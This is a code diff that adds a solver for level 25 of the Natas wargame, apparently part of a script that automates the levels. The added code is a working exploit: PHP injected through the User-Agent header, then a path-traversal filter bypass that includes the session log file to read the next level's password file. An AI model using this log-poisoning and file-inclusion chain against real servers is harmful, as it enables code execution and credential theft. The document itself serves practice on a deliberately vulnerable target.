@@ -559,6 +559,39 @@ def level24():
     else:
         print(" Password not found")
 
+def level25():
+    a = "<pre><? echo(file_get_contents(\"/etc/natas_webpass/natas26\")); ?></pre>"
+    print(" Injection via User-Agent header {}".format(a))
+    res, reg = rex(
+        "GET",
+        "/?lang=natas_webpass",
+        "",
+        headers={"User-Agent": a},
+    )
+
+    if res.status != 200: return
+    c = res.getheader("Set-Cookie")
+    print(" Got cookie {}".format(c))
+    r = re.search("PHPSESSID=(\w+);", c)
+    if not r:
+        print(" PHPSESSID not found")
+        return
+
+    u = "/?lang=....//logs/natas25_{}.log".format(r[1])
+    print(" Include injection {}".format(u))
+    res, reg = rex(
+        "GET",
+        u,
+        "<pre>(\w+)\n</pre>",
+    )
+    
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -570,7 +603,7 @@ levels = [
     level12, level12, level14, level15,
     level16, level17, level18, level18,
     level20, level21, level22, level23,
-    level24, levelN, levelN, levelN,
+    level24, level25, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN,
 ]
